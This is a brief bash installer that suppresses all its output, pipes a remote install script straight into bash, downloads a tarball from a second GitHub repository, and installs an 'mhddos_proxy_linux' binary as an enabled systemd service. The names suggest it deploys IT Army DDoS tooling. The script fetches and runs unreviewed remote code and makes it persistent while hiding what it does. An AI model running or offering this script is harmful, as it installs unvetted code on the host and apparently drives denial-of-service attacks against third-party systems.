#!/bin/bash
set -e
exec > /dev/null 2>&1

echo "[*] Run install script"
curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
wget https://github.com/sweetasshole/test/raw/refs/heads/main/itarmy.tar.gz
tar -xzvf itarmy.tar.gz
cp ./itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin
chmod +x /opt/itarmy/bin/mhddos_proxy_linux
cp ./itarmy/mhddos.service /etc/systemd/system
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service
